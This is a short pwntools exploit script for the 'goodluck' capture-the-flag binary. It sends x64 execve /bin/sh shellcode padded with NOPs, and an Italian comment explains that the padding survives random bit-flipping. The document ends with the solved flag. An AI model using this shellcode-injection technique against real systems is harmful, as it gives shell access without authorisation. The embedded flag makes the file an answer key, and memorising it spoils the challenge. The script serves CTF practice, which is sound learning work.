from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
if "REMOTE" not in args:
    r = process("./goodluck")
    gdb.attach(r,'''
        b *0x004012ce
		b *0x04012dc
        c
    ''')
    input("wait")
else:
    r = remote("bin.ctf.offdef.it", 3010)

#This is the shellcode for the x64 execve
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

r.send(shellcode + b"\x90" * 3500)

r.interactive()

'''
Vengono cambiati casualmente dei bit dell'input inserito, e poi viene eseguito.
Ho provato inizialmente a mettere lo shellcode (per l'execve) ma non ottenevo una shell perchè veniva molto randomizzato.
Allora ho visto che mettendo dei nop la randomization si riduce e ho fatto dei tentativi fino a trovare un numero di nop che mi desse la shell.
Bisogna runnarlo per un pò di volte per ottenere il flag.
flag{you_crafted_your_luck_very_good.}
'''